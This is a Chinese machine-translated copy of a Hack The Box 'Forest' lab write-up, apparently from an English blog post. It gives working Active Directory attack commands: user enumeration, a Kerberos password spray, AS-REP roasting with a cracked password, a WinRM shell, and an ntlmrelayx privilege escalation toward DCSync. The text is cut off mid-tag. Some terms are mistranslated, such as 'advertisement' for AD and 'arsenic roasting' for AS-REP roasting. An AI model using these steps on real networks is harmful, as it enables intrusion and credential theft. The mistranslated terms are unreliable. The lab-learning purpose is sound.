<html>
<head>
<title>[HTB] Forest — Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[HTB]森林——报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf?source=collection_archive---------0-----------------------#2020-05-11">https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf?source=collection_archive---------0-----------------------#2020-05-11</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/3f1c6bba9202073209470975ea959401.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/0*2Q-ZaGxKOD2dP5DX.png"/></div></figure><p id="fde1" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">欢迎来到HTB森林报道！这个盒子是一个由易到难的Windows盒子。攻击媒介是非常真实的活动目录利用。</p><h2 id="ba64" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">初始访问</h2><p id="b4ab" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">我们将确定一个不需要Kerberos预认证的用户。有了这个，我们就可以执行一个AS-REP烘焙来获取她的密码哈希。破解散列后，我们可以通过暴露的WinRM服务登录到系统。</p><h2 id="d82a" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">权限提升</h2><p id="4973" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">用户是负责用户帐户管理(添加/删除/修改)的“帐户操作员”组的一员。通过该访问权限，我们可以创建一个新用户，并将其添加到“Exchange Windows权限”组，默认情况下，该组可以在域控制器(= DCSync)上执行复制。这样，我们就可以获得管理员用户的NTLM散列来根化机器。</p><p id="3fdc" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们开始吧！</p></div><div class="ab cl lt lu hx lv" role="separator"><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly"/></div><div class="im in io ip iq"><figure class="mb mc md me gt ju gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/9da73fb3a0ff3466ce2ba1e5ee591dba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/1*DcTN3xzG8ZWImnCqGdflbw.png"/></div></figure><h1 id="25af" class="mf kw it bd kx mg mh mi la mj mk ml ld mm mn mo lg mp mq mr lj ms mt mu lm mv bi translated">侦察</h1><p id="248a" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi">_________________________________________________________________</p><h1 id="9068" class="mf kw it bd kx mg mh mi la mj mk ml ld mm mn mo lg mp mq mr lj ms mt mu lm mv bi translated">Nmap</h1><p id="925a" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">让我们从使用以下命令进行初始端口扫描开始:</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="5fad" class="kv kw it mx b gy nb nc l nd ne">$ nmap -Pn — open -sC -sV -p- -T4 10.10.10.161</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nf"><img src="../Images/25e3c58a5be1c3998e01ccd1159bd46c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZuMu1fWhDrpF0bJYlBdn8w.png"/></div></div></figure><p id="da7f" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated"><strong class="jz iu">需要注意的有趣端口:</strong></p><ul class=""><li id="ff44" class="nk nl it jz b ka kb ke kf ki nm km nn kq no ku np nq nr ns bi translated"><strong class="jz iu">Kerberos(88/TCP)</strong>—Windows Kerberos协议服务。</li><li id="9071" class="nk nl it jz b ka nt ke nu ki nv km nw kq nx ku np nq nr ns bi translated"><strong class="jz iu"> LDAP (389/TCP) </strong> —活动目录LDAP。LDAP通常提供关于广告的详细信息。而且如果允许匿名绑定，我们可以查询很多好的广告信息，比如用户信息。</li><li id="7836" class="nk nl it jz b ka nt ke nu ki nv km nw kq nx ku np nq nr ns bi translated"><strong class="jz iu"> SMB (445/TCP) </strong> — Windows服务器消息块(“SMB”)协议。对于SMB，检查它是否允许空会话总是有好处的。如果允许，我们可以像LDAP一样列举许多有用的广告信息。</li><li id="3982" class="nk nl it jz b ka nt ke nu ki nv km nw kq nx ku np nq nr ns bi translated"><strong class="jz iu"> WinRM (5985/TCP) </strong> —微软实现WS-Management协议。这可以允许通过PowerShell进行远程连接。</li></ul><h1 id="5abd" class="mf kw it bd kx mg mh mi la mj mk ml ld mm mn mo lg mp mq mr lj ms mt mu lm mv bi translated">用户枚举</h1><p id="f1bb" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">对于这个盒子，有两种方式枚举AD用户:<em class="ny"> 1) LDAP空绑定；2) SMB空会话</em>。根据我的经验，这两种都是非常常见的错误配置，可以在实际的测试项目中发现。</p><h2 id="7c5e" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">#1 — LDAP空绑定</h2><p id="ed8a" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">每当我看到LDAP服务时，我都会运行下面的<code class="fe nz oa ob mx b">ldapsearch</code>命令:</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="f91f" class="kv kw it mx b gy nb nc l nd ne">$ ldapsearch -H ldap://10.10.10.161 -x -s base '' "(objectClass=*)" "*" +</span></pre><p id="9122" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">它只是对任何可用的<code class="fe nz oa ob mx b">objectClass</code>进行基本搜索，但它可以透露一些有用的信息，比如确切的域名上下文。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi oc"><img src="../Images/2e568a1c6f094acc00ae4ef13ba2cb88.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5Egs2J5B1TOR0HbSG1B42Q.png"/></div></div></figure><p id="85d7" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">接下来，我们可以检查LDAP上的空绑定。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="26d0" class="kv kw it mx b gy nb nc l nd ne">$ ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div class="gh gi od"><img src="../Images/b648b90536587a172dd6b02fba8421a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/1*Irq6oLFvYsfVdO5VQ_sfbQ.png"/></div></figure><p id="9756" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">而且成功了。我可以继续讲述所有的LDAP枚举技术，以及我们可以滥用哪些技术来进行空绑定访问，但是在本演练中，让我们只关注用户枚举:)</p><p id="f136" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">所以，对于用户枚举，我们可以搜索<code class="fe nz oa ob mx b">objectClass</code>作为人，搜索<code class="fe nz oa ob mx b">sAMAccountName:</code>。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="eab7" class="kv kw it mx b gy nb nc l nd ne"><strong class="mx iu">### LDAP User Query</strong><br/>$ ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local "(objectClass=person)" | grep "sAMAccountName:"</span><span id="4a9e" class="kv kw it mx b gy oe nc l nd ne">sAMAccountName: Guest</span><span id="54fa" class="kv kw it mx b gy oe nc l nd ne">... Machine Accounts Redacted ...</span><span id="8c2b" class="kv kw it mx b gy oe nc l nd ne"><strong class="mx iu">sAMAccountName: sebastien<br/>sAMAccountName: lucinda<br/>sAMAccountName: andy<br/>sAMAccountName: mark<br/>sAMAccountName: santi</strong></span></pre><h2 id="ee2c" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">#2 — SMB空会话</h2><p id="1d82" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">如果SMB允许空身份验证，也可以枚举AD用户。为此，我们可以使用一个著名的工具叫做<code class="fe nz oa ob mx b">enum4linux</code>。这个工具只是一堆其他rcp客户机工具的包装器，但是它使它变得如此方便。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="5e06" class="kv kw it mx b gy nb nc l nd ne">$ enum4linux -v 10.10.10.161</span></pre><p id="7691" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">如果允许空会话，这将输出大量数据。它还将枚举所有用户。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="5d48" class="kv kw it mx b gy nb nc l nd ne">[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.10.161' 2&gt;&amp;1<br/>user:[Administrator] rid:[0x1f4]<br/>user:[Guest] rid:[0x1f5]<br/>user:[krbtgt] rid:[0x1f6]</span><span id="a553" class="kv kw it mx b gy oe nc l nd ne">... Machine Accounts Redacted ...</span><span id="4808" class="kv kw it mx b gy oe nc l nd ne">user:[sebastien] rid:[0x479]<br/>user:[lucinda] rid:[0x47a]<strong class="mx iu"><br/>user:[svc-alfresco] rid:[0x47b]             # Additional user found <br/></strong>user:[andy] rid:[0x47e]<br/>user:[mark] rid:[0x47f]<br/>user:[santi] rid:[0x480]</span></pre><p id="2d99" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">有趣的是，LDAP <code class="fe nz oa ob mx b">sAMAccountName:</code>搜索没有识别出“svc-alfresco”用户帐户。进一步研究发现，该帐户是“服务帐户”OU的一部分，不知何故<code class="fe nz oa ob mx b">sAMAccountName:</code>并不存在。不太确定是否是因为空绑定访问的限制。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi of"><img src="../Images/9228162351e7ce9b40d4cdc9a4b7e645.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2kf7uKDX2t8cOG6Dzyb5sA.png"/></div></div></figure><p id="7404" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">一旦用户枚举完成，我们可以快速检查是否有任何开放共享，我们也可以使用空身份验证访问。然而，这没什么。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="7c63" class="kv kw it mx b gy nb nc l nd ne">$ smbclient -L 10.10.10.161</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div class="gh gi og"><img src="../Images/bfcd15b7765b5e116f9bbcdaac9b25a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:746/format:webp/1*xluuhr067yuONxeE1QpaLg.png"/></div></figure></div><div class="ab cl lt lu hx lv" role="separator"><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly"/></div><div class="im in io ip iq"><h1 id="0803" class="mf kw it bd kx mg oh mi la mj oi ml ld mm oj mo lg mp ok mr lj ms ol mu lm mv bi translated">最初的立足点</h1><p id="245f" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi">_________________________________________________________________</p><h2 id="1466" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">Kerberos密码喷涂</h2><p id="599f" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">HTB挑战赛很少要求我们进行密码猜测攻击。然而，我当时的想法是，既然我们可以枚举有效用户，并且像Kerberos、LDAP和SMB这样的协议可用，我们就可以进行一些密码猜测攻击。</p><p id="af19" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">在此之前，我很快检查了密码政策的情况下，如果有任何锁定阈值设置。<code class="fe nz oa ob mx b">enum4linux</code>已找到密码策略信息，并且帐户锁定阈值被设置为“无”</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/bad7610334f09d7389d9de55aa187a0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*XrQMS5c_AgVBrGvLPEGZ6Q.png"/></div></figure><p id="91d3" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">接下来，我们可以使用一个非常方便的Kerberos密码猜测工具<code class="fe nz oa ob mx b"><a class="ae on" href="https://github.com/ropnop/kerbrute" rel="noopener ugc nofollow" target="_blank">kerbrute</a></code>。当您进行内部测试时，基于Kerberos的密码猜测比LDAP或SMB等其他密码猜测更受欢迎。有几个原因，但最大的原因是因为:<em class="ny"> 1)并不是所有的环境监视器都会发现Kerberos身份验证失败；2)基于Kerberos的认证比其他的快很多；3)当登录失败时，它往往会给我们一些详细的错误</em>。</p><p id="a016" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">在使用密码列表进行全面的密码猜测之前，我使用verbose选项测试了该工具。它最终发现了一个不需要预认证的用户(= svc-alfresco)。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="16c8" class="kv kw it mx b gy nb nc l nd ne">$ ./kerbrute passwordspray -d htb.local --dc 10.10.10.161 user.txt 'password123' -v</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi oo"><img src="../Images/94deb5ec33873e1a88f72d8dabf18eb6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JEroJWJN43e0gXg4TH61Rg.png"/></div></div></figure><h2 id="6bce" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">砷焙烧</h2><p id="d19b" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">对于未启用预认证的用户帐户，很容易受到冒充攻击。我们可以在不提供任何身份验证的情况下请求该用户的Kerberos TGT票证，而TGT票证将使用该帐户的密码进行加密。所以我们可以离线破解。</p><p id="05de" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">使用<code class="fe nz oa ob mx b">Impacket</code>的<code class="fe nz oa ob mx b">GetNPUsers.py</code>脚本，我们可以进行攻击:</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="bf7d" class="kv kw it mx b gy nb nc l nd ne">$ ./GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi op"><img src="../Images/3f113ace1d8b8238f410b7c30caded65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5oX64SWzTWP9sp4rYtCpeg.png"/></div></div></figure><p id="e78f" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">用rockyou.txt运行与<code class="fe nz oa ob mx b">John</code>的hash，可以成功破解“svc-alfresco”用户(= s3rvice)的明文密码。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi oq"><img src="../Images/84dc668816c3a92defc2a6dacf5c1c3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-XN_WDDOezloUaHktzomTg.png"/></div></div></figure><p id="cf13" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">使用<code class="fe nz oa ob mx b">CrackMapExec</code>，我们可以确认密码是否有效。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi or"><img src="../Images/13dbacf8cd225504fe29c6a3e0afd6f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-9WR9n9OWT1u-Rp3QmIOwA.png"/></div></div></figure><h2 id="af18" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">邪恶-WinRM</h2><p id="b6a0" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">从<code class="fe nz oa ob mx b">nmap</code>扫描来看，我们可以用来获得交互式shell的服务很少:SMB (TCP/445)和WinRM (TCP/5985)。对于中小型企业来说，除非我们有机器上的管理权限，否则我们使用远程客户端如<code class="fe nz oa ob mx b">psexec.py</code>或<code class="fe nz oa ob mx b">wmiexec.py</code>获得外壳是有限的。但是，对于WinRM，如果我们的用户帐户是“远程管理用户”组的一部分，我们可以获得一个基于PowerShell的Shell。我使用以下命令来验证“svc-alfresco”用户确实是“远程管理用户”的一部分:</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="e324" class="kv kw it mx b gy nb nc l nd ne"><strong class="mx iu">[LDAP to Query Members of the "Remote Management Users"]</strong><br/>$ ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local | grep -A 11 -i "Remote Management Users"</span><span id="55a4" class="kv kw it mx b gy oe nc l nd ne"><strong class="mx iu">[NET RPC Command - Query "Privileged IT Accounts"]</strong><br/>$ net rpc group members 'Privileged IT Accounts' -W 'htb.local' -I '10.10.10.161' -U'svc-alfresco'%'s3rvice' 2&gt;&amp;1</span><span id="3a7a" class="kv kw it mx b gy oe nc l nd ne"><strong class="mx iu">[NET RPC Command - Query "Service Accounts"]</strong><br/>$ net rpc group members 'Service Accounts' -W 'htb.local' -I '10.10.10.161' -U'svc-alfresco'%'s3rvice' 2&gt;&amp;1</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi os"><img src="../Images/dd4f07acbab7335482fd82570e3e1ebd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZVhgtJrJzv186dCm4GUrJA.png"/></div></div></figure><p id="1a48" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">对于外壳，我们可以使用一个叫做<code class="fe nz oa ob mx b"><a class="ae on" href="https://github.com/Hackplayers/evil-winrm" rel="noopener ugc nofollow" target="_blank">Evil-WinRM</a></code>的工具。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="ce68" class="kv kw it mx b gy nb nc l nd ne">$ ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi ot"><img src="../Images/a58bd463303eaedcb5855d38dffd90b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4_q_L3U0S-0PRewj3wb-Iw.png"/></div></div></figure><h2 id="3d60" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">user.txt</h2><p id="1eb3" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">太好了。有了这个权限，我们可以读取<code class="fe nz oa ob mx b">user.txt</code>文件。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/e7eb478c1d712aaf0523e199f8ce16d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*mwSF6xRKBpbe5Rl4cwPp9g.png"/></div></figure></div><div class="ab cl lt lu hx lv" role="separator"><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly"/></div><div class="im in io ip iq"><h1 id="eae0" class="mf kw it bd kx mg oh mi la mj oi ml ld mm oj mo lg mp ok mr lj ms ol mu lm mv bi translated">权限提升</h1><p id="54f0" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi">_________________________________________________________________</p><h2 id="f6ed" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">猎犬</h2><p id="bae7" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">因为我们有一组有效的凭证，所以我们可以利用一个名为<code class="fe nz oa ob mx b"><a class="ae on" href="https://github.com/BloodHoundAD/BloodHound" rel="noopener ugc nofollow" target="_blank">Bloodhound</a></code>的强大的活动目录审计工具。对于ingester，我使用了它的python版本。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="31cb" class="kv kw it mx b gy nb nc l nd ne">$ ./bloodhound.py -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi ov"><img src="../Images/4f0f16d619038b7e4fa01143b60f0b92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*422Qux1mbB_ub3l5yKGJSg.png"/></div></div></figure><p id="2712" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">一旦完成，我将结果输入到图形视图的<code class="fe nz oa ob mx b">Bloodhound</code>中。并搜索了“svc-alfresco”用户。这表明该用户实际上是“帐户操作员”组的一部分。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi ow"><img src="../Images/b86abea5d2fb6e987d7ff7883926de57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TOqJrgiaxvCHHD74MJwhyQ.png"/></div></div></figure><p id="6444" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这是AD中的特权组之一，可以执行以下操作:</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi ox"><img src="../Images/019b63e47587a0c10fa6b5f4d223747e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KkkyOdtHJaAmdtJoC63h9A.png"/></div></div><figcaption class="oy oz gj gh gi pa pb bd b be z dk translated">来源:<a class="ae on" href="https://adsecurity.org/?p=3658" rel="noopener ugc nofollow" target="_blank">https://adsecurity.org/?p=3658</a></figcaption></figure><h2 id="668d" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">使用Exchange提升权限</h2><p id="df53" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">当我们还查询域组时，我们可以看到与Exchange相关的组。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi pc"><img src="../Images/04a98410b3322fbd89e4f6338d8b9d0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CidFBe6k3uaZAiftRFsJ_w.png"/></div></div></figure><p id="b59e" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">因为我们知道“Account Operators”组可以创建一个新用户，并将其添加到域组(除了管理组，如“Domain Admins”)，所以我们可以利用这一点来进行以下权限提升攻击，以授予我们DCSync权限(Fox的原始记录-可以在此处找到<a class="ae on" href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" rel="noopener ugc nofollow" target="_blank"/>):</p><ol class=""><li id="828b" class="nk nl it jz b ka kb ke kf ki nm km nn kq no ku pd nq nr ns bi translated">创建一个新用户，并将其添加到<code class="fe nz oa ob mx b">Exchange Trusted Subsystem</code>安全组。(默认情况下，该组是对安装了Exchange的域的域对象拥有<code class="fe nz oa ob mx b">writeDACL</code>权限的<code class="fe nz oa ob mx b">Exchange Windows Permissions</code>安全组的成员。)</li></ol><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="07c0" class="kv kw it mx b gy nb nc l nd ne"><strong class="mx iu">[Forest Box] - WinRM Session</strong></span><span id="61d2" class="kv kw it mx b gy oe nc l nd ne">PS C:\&gt; net user bigb0ss bigb0ss /add /domain<br/>PS C:\&gt; net group "Exchange Trusted Subsystem" bigb0ss /add /domain</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi pe"><img src="../Images/4868706cc916a320d9f3cb74423243c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2gK1mqRgKNyjHReJ-gtOoA.png"/></div></div></figure><p id="8e25" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">2.使用<code class="fe nz oa ob mx b">--escalate-user</code>标志运行<code class="fe nz oa ob mx b">ntlmrelayx.py</code>中间人(“mitm”)工具。这实际上是当它识别出“bigb0ss”用户在同一网络上的登录尝试时，它将自动检查用户权限，如果它可以修改域ACL，它将修改用户权限，以向用户帐户添加<code class="fe nz oa ob mx b">Replication-Get-Changes-All</code>权限，这可以执行DCSync。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="7e9a" class="kv kw it mx b gy nb nc l nd ne"><strong class="mx iu">[My Kali Box] - Screen #1</strong></span><span id="21f3" class="kv kw it mx b gy oe nc l nd ne">$ ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user bigb0ss</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi pf"><img src="../Images/0fbcb720330d9c8033e5156016190976.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rgfgGZ3nkqp33l00tRumMQ.png"/></div></div></figure><p id="340e" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">3.然后，我们将使用“bigb0ss”帐户进行随机身份验证。在这种情况下，我使用<code class="fe nz oa ob mx b">psexec.py</code>对我自己的Kali box进行了一次认证尝试。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="a8da" class="kv kw it mx b gy nb nc l nd ne"><strong class="mx iu">[My Kali Box] - Screen #2</strong></span><span id="852d" class="kv kw it mx b gy oe nc l nd ne">$ psexec.py htb.local/bigb0ss:bigb0ss@10.10.14.39</span></pre><p id="a2a7" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">显然，这将会失败，因为我的Kali机器上没有运行SMB服务，而且它也不是我机器的有效凭证。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nf"><img src="../Images/79c19927678c784fda2f3f263eb31187.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-n52PL4Bw7sh4vNcZjxSFQ.png"/></div></div></figure><p id="afa4" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">4.然而，<code class="fe nz oa ob mx b">ntlmrelay.py</code>工具会将捕获到的<code class="fe nz oa ob mx b">htb.local/bigb0ss:bigb0ss</code>的认证尝试转发给<code class="fe nz oa ob mx b">ldap://10.10.10.161</code>(森林盒子)。由于它是Forces box的有效凭证，它将成功地验证并提升我们添加<code class="fe nz oa ob mx b">Replication-Get-Changes-All</code>的权限。</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi pg"><img src="../Images/c34a9e198faa0920bb7b051be0b7e7d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xT2tCgaIJzaTWBppJ26H_w.png"/></div></div></figure><h2 id="47d2" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">数据同步</h2><p id="6d6e" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">随着权限的提升，我们可以使用<code class="fe nz oa ob mx 